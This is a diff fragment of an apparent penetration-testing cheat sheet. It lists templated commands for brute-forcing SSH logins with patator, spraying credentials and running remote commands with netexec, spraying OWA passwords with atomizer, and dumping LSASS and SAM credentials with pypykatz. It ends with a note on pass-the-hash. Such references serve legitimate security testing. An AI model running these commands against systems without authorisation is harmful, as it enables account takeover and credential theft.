+ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
+ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
 ```
 
 ### Patator
@@ -692,15 +706,15 @@ $ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<
 > https://github.com/lanjelot/patator
 
 ```c
-$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:mesg='Authentication failed.'
-$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:fgrep='failed'
-$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:egrep='failed'
+ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:mesg='Authentication failed.'
+ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:fgrep='failed'
+ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:egrep='failed'
 ```
 
 ### PDFCrack
 
 ```c
-$ pdfcrack -f file.pdf -w /PATH/TO/WORDLIST/<WORDLIST>
+ pdfcrack -f file.pdf -w /PATH/TO/WORDLIST/<WORDLIST>
 ```
 
 ### pypykatz
@@ -708,8 +722,8 @@ $ pdfcrack -f file.pdf -w /PATH/TO/WORDLIST/<WORDLIST>
 > https://github.com/skelsec/pypykatz
 
 ```c
-$ pypykatz lsa minidump lsass.dmp
-$ pypykatz registry --sam sam system
+ pypykatz lsa minidump lsass.dmp
+ pypykatz registry --sam sam system
 ```
 
 ### RsaCtfTool
@@ -717,7 +731,7 @@ $ pypykatz registry --sam sam system
 > https://github.com/Ganapati/RsaCtfTool
 
 ```c
-$ python3 RsaCtfTool.py --publickey /PATH/TO/<KEY>.pub --uncipherfile /PATH/TO/FILE/<FILE>.enc
+ python3 RsaCtfTool.py --publickey /PATH/TO/<KEY>.pub --uncipherfile /PATH/TO/FILE/<FILE>.enc
 ```
 
 ### Spray-Passwords
@@ -1154,7 +1168,7 @@ PS C:\> .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
 #### OWA
 
 ```c
-$ python3 atomizer.py owa <RHOST> <PASSWORDS> <USERNAMES> -i 0:0:01
+ python3 atomizer.py owa <RHOST> <PASSWORDS> <USERNAMES> -i 0:0:01
 ```
 
 ### VNC Password Recovery
@@ -1173,3 +1187,12 @@ irb: warn: can't alias jobs from irb_jobs.
 => "sT333ve2"
 >>
 ```
+
+
+
+### NTLM&#x20;
+
+<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>
+
+* Lateral Movement:
+  * Pass the hash attack (PtH)
